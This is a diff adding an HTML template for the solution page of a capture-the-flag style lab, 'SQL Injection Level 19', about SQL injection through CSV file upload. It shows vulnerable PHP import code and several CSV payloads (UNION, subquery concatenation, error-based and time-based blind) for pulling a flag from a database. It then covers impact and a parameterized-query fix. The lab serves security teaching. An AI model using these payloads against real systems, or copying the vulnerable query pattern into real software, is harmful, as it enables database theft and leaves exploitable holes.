@@ -1,0 +1,238 @@
+{% extends 'base.html' %}
+
+{% block title %}Solution: SQL Injection Level 19{% endblock %}
+
+{% block content %}
+<div class="row">
+    <div class="col-md-8 offset-md-2">
+        <div class="card">
+            <div class="card-header bg-success text-white">
+                <h2 class="text-center">Solution: Level 19 - SQL Injection via File Upload</h2>
+            </div>
+            <div class="card-body">
+                <h3>Vulnerability Explanation</h3>
+                <p>
+                    This challenge demonstrates a SQL injection vulnerability in a file upload feature. File upload features are common in web applications, allowing users to upload documents, images, data files, and other content. When these files contain structured data (like CSV or XML), applications often process and import this data into databases.
+                </p>
+                <p>
+                    The vulnerability occurs because:
+                </p>
+                <ul>
+                    <li>The application extracts values from uploaded CSV files</li>
+                    <li>These values are used directly in SQL queries without proper validation or parameterization</li>
+                    <li>The application fails to properly sanitize or escape special characters in the file content</li>
+                </ul>
+                <p>
+                    This type of vulnerability is particularly dangerous because file content is often trusted more than direct user input, and batch processing of file data may happen in background jobs with elevated privileges.
+                </p>
+
+                <h3>The Vulnerable Code</h3>
+                <p>
+                    The vulnerability exists in how the application processes the CSV file and uses the extracted values in SQL queries. Here's a simplified example of the vulnerable code:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>// Vulnerable code example (PHP)
+function processCSVFile($filePath) {
+    // Open the CSV file
+    $handle = fopen($filePath, 'r');
+
+    // Skip the header row
+    $header = fgetcsv($handle);
+
+    // Process each row
+    while (($data = fgetcsv($handle)) !== FALSE) {
+        $id = $data[0];
+        $name = $data[1];
+        $email = $data[2];
+        $department = $data[3];
+
+        // Vulnerable SQL query
+        $query = "INSERT INTO employees (id, name, email, department)
+                 VALUES ('$id', '$name', '$email', '$department')";
+
+        // Execute the query
+        $result = $db->query($query);
+
+        if (!$result) {
+            echo "Error importing row: " . $db->error;
+        }
+    }
+
+    fclose($handle);
+}</code></pre>
+                <p>
+                    The vulnerability is in the direct use of CSV values in the SQL query without proper sanitization or parameterization.
+                </p>
+
+                <h3>Solution</h3>
+                <p>To exploit this vulnerability, follow these steps:</p>
+
+                <h4>1. Understand the CSV Format</h4>
+                <p>
+                    First, we need to understand the format of the CSV file expected by the application. Based on the challenge description and the default CSV template, the file should have four columns:
+                </p>
+                <ul>
+                    <li><code>id</code>: A unique identifier for each record</li>
+                    <li><code>name</code>: The name of the employee</li>
+                    <li><code>email</code>: The email address of the employee</li>
+                    <li><code>department</code>: The department the employee belongs to</li>
+                </ul>
+
+                <h4>2. Identify the Vulnerable Field</h4>
+                <p>
+                    Any of the fields in the CSV file could potentially be vulnerable to SQL injection. For this challenge, we'll focus on the <code>name</code> field, as it's a common target for injection and likely to have fewer validation checks than fields like email or ID.
+                </p>
+
+                <h4>3. Craft a SQL Injection Payload</h4>
+                <p>
+                    We can craft a CSV file with a malicious payload in the <code>name</code> field to exploit the SQL injection vulnerability:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>id,name,email,department
+1,"John Doe' UNION SELECT id, flag, 'test@example.com', 'IT' FROM admin_flags; --",john.doe@example.com,IT</code></pre>
+                </div>
+                <p>
+                    When this CSV file is processed, the SQL query for the first row will be:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>INSERT INTO employees (id, name, email, department)
+VALUES ('1', 'John Doe' UNION SELECT id, flag, 'test@example.com', 'IT' FROM admin_flags; --', 'john.doe@example.com', 'IT')</code></pre>
+                <p>
+                    This query will cause a syntax error because the UNION SELECT statement is not valid in an INSERT statement. However, the application might display the error message, which could contain the results of the UNION SELECT query.
+                </p>
+
+                <h4>4. Alternative Approach: Using a Subquery</h4>
+                <p>
+                    If the above approach doesn't work, we can try a different payload that uses a subquery to extract the flag:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>id,name,email,department
+1,"John Doe'||(SELECT flag FROM admin_flags LIMIT 1)||'",john.doe@example.com,IT</code></pre>
+                </div>
+                <p>
+                    When this CSV file is processed, the SQL query for the first row will be:
+                </p>
+                <pre class="bg-light p-3 rounded"><code>INSERT INTO employees (id, name, email, department)
+VALUES ('1', 'John Doe'||(SELECT flag FROM admin_flags LIMIT 1)||'', 'john.doe@example.com', 'IT')</code></pre>
+                <p>
+                    This query will concatenate the result of the subquery (the flag) with the name, effectively embedding the flag in the name field of the inserted record.
+                </p>
+
+                <h4>5. More Advanced Approach: Using Error-based Injection</h4>
+                <p>
+                    For a more sophisticated approach, we can use error-based injection to extract the flag:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>id,name,email,department
+1,"John Doe' AND (SELECT CASE WHEN (SELECT SUBSTR(flag,1,1) FROM admin_flags LIMIT 1)='R' THEN 1/0 ELSE 1 END)=1 AND '1'='1",john.doe@example.com,IT</code></pre>
+                </div>
+                <p>
+                    This payload uses a CASE statement to cause a division by zero error if the first character of the flag is 'R'. By iterating through different characters and positions, we can extract the entire flag character by character.
+                </p>
+
+                <h4>6. Using Time-based Blind Injection</h4>
+                <p>
+                    If the application doesn't return error messages, we can use time-based blind injection:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>id,name,email,department
+1,"John Doe' AND (SELECT CASE WHEN (SELECT SUBSTR(flag,1,1) FROM admin_flags LIMIT 1)='R' THEN (SELECT pg_sleep(5)) ELSE 1 END)=1 AND '1'='1",john.doe@example.com,IT</code></pre>
+                </div>
+                <p>
+                    This payload will cause the query to sleep for 5 seconds if the first character of the flag is 'R'. By measuring the response time, we can determine if the condition is true or false, and extract the flag character by character.
+                </p>
+
+                <h4>7. Exploiting Other Fields</h4>
+                <p>
+                    If the <code>name</code> field is properly sanitized, we can try injecting through other fields:
+                </p>
+                <div class="alert alert-secondary">
+                    <pre><code>id,name,email,department
+1,John Doe,"john.doe@example.com' UNION SELECT id, flag, 'test@example.com', 'IT' FROM admin_flags; --",IT</code></pre>
+                </div>
+                <p>
+                    This flexibility in where to place the injection makes CSV-based SQL injection particularly versatile.
+                </p>
+
+                <h3>Real-world Impact</h3>
+                <p>
+                    SQL injection vulnerabilities in file upload features are particularly relevant in:
+                </p>
+                <ul>
+                    <li><strong>Data Import Tools</strong>: ETL tools that import data from CSV, Excel, or XML files</li>
+                    <li><strong>CRM Systems</strong>: Customer relationship management systems that allow bulk import of contact data</li>
+                    <li><strong>E-commerce Platforms</strong>: Product catalog import features in online stores</li>
+                    <li><strong>HR Systems</strong>: Employee data import features in human resources applications</li>
+                </ul>
+                <p>
+                    The impact of these vulnerabilities can be severe:
+                </p>
+                <ul>
+                    <li>Unauthorized access to sensitive business data</li>
+                    <li>Exposure of customer information</li>
+                    <li>Manipulation of imported data</li>
+                    <li>Complete compromise of the database</li>
+                </ul>
+
+                <h3>Prevention</h3>
+                <p>To prevent SQL injection vulnerabilities in file upload features, developers should:</p>
+                <ul>
+                    <li>
+                        <strong>Use Parameterized Queries</strong> or prepared statements:
+                        <pre class="bg-light p-3 rounded"><code>// Safe code example (PHP with PDO)
+function processCSVFile($filePath) {
+    // Open the CSV file
+    $handle = fopen($filePath, 'r');
+
+    // Skip the header row
+    $header = fgetcsv($handle);
+
+    // Prepare the statement
+    $stmt = $db->prepare("INSERT INTO employees (id, name, email, department)
+                         VALUES (?, ?, ?, ?)");
+
+    // Process each row
+    while (($data = fgetcsv($handle)) !== FALSE) {
+        $id = $data[0];
+        $name = $data[1];
+        $email = $data[2];
+        $department = $data[3];
+
+        // Execute the statement with parameters
+        $stmt->execute([$id, $name, $email, $department]);
+    }
+
+    fclose($handle);
+}</code></pre>
+                    </li>
+                    <li>
+                        <strong>Validate and Sanitize File Content</strong>:
+                        <ul>
+                            <li>Validate data types and formats for each field</li>
+                            <li>Implement strict validation rules for each column</li>
+                            <li>Reject files with suspicious content</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Use a Secure CSV Parsing Library</strong>:
+                        <ul>
+                            <li>Use libraries that handle CSV parsing securely</li>
+                            <li>Avoid custom CSV parsing code that might be vulnerable</li>
+                        </ul>
+                    </li>
+                    <li>
+                        <strong>Implement Proper Error Handling</strong>:
+                        <ul>
+                            <li>Avoid exposing detailed error messages to users</li>
+                            <li>Log errors for debugging but return generic messages to users</li>
+                        </ul>
+                    </li>
+                </ul>
+
+                <div class="mt-4">
+                    <a href="{{ url_for('sqli_level19') }}" class="btn btn-outline-primary">Back to Challenge</a>
+                    <a href="{{ url_for('vulnerabilities') }}" class="btn btn-outline-secondary float-end">All Challenges</a>
+                </div>
+            </div>
+        </div>
+    </div>
+</div>
+{% endblock %}
